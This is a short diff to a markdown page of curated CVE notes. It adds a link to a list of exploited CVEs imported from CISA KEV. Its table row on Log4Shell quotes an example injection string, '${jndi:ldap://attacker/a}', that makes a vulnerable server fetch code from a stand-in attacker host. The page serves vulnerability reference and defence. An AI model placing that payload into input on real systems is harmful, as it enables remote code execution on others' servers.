@@ -52,6 +52,8 @@
 
 ## Curated CVE pages
 
+Hand-written field notes. See also the **[Top 1000 exploited CVEs](cves-top.md)** imported from CISA KEV.
+
 | CVE | Name | CVSS | KEV | Summary |
 |---|---|---|---|---|
 | [CVE-2021-44228](../data/cves/2021/CVE-2021-44228.yml) | Log4Shell | 10 | ✅ | JNDI lookup injection in Apache Log4j 2. An attacker who can get a crafted string such as ${jndi:ldap://attacker/a} logged can make the server load and execute remote code. Because Log4j is embedded in a huge number of Java products, it became one of the most widely exploited vulnerabilities ever. |
